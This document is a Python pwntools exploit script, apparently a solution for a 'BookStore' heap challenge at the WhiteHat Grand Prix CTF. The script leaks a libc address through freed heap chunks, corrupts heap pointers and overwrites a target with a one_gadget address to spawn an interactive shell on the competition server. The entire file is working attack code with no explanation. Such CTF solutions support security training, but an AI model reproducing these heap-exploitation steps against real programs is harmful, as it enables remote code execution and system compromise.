#!/usr/bin/env python
from pwn import *

def add(title, size, brief, best='N', ref='Z'):
    s.sendlineafter('choice:', '1')
    s.sendlineafter('Title:', title)
    s.sendlineafter('size:', str(size))
    if len(brief) < size:
        brief += '\n'
    s.sendafter('brief:', brief)
    s.sendlineafter('title:', ref)
    s.sendlineafter('(Y/N)', best)

def edit(old_title, new_title, size, brief, best='N'):
    s.sendlineafter('choice:', '2')
    s.sendlineafter('title:', old_title)
    s.sendlineafter('title:', new_title)
    s.sendlineafter('size:', str(size))
    if len(brief) < size:
        brief += '\n'
    s.sendafter('brief:', brief)
    s.sendlineafter('(Y/N)', best)

def remove(title):
    s.sendlineafter('choice:', '3')
    s.sendlineafter('Title:', title)

def show():
    s.sendlineafter('choice:', '4')

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./BookStore')
    else:
        s = remote('pwn02.grandprix.whitehatvn.com', 8005)

    for i in range(7):
        add(str(i), 0x100, str(i))
    add('A', 0x100, 'A', 'Y')
    for i in range(7):
        remove(str(i))
    remove('A')
    add('B', 0x50, 'B', 'Y')
    show()
    s.recvuntil('A|\x1b[32m')
    libc_base = u64(s.recv(6).ljust(8, '\0')) - 0x3ebca0
    log.info('libc base: %#x' % libc_base)

    edit('A', 'A', 0x3a, '\0' * 7)
    add('B', 0x50, 'B')

    add('C', 0x3a, 'C', 'Y')
    remove('C')
    add('D', 0x50, 'D', 'Y')
    edit('B', 'B', 0x3a, '\0' * 7)
    add('D', 0x50, 'D')

    one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
    payload = ''
    payload += '\0' * 8
    payload += p64(0x6021f8)
    payload += 'C' + '\0' * 0x1f
    payload += '\0' * 2
    payload += p64(libc_base + one_gadgets[2])
    edit('B', 'B', 0x3a, payload)
    show()
    s.interactive()
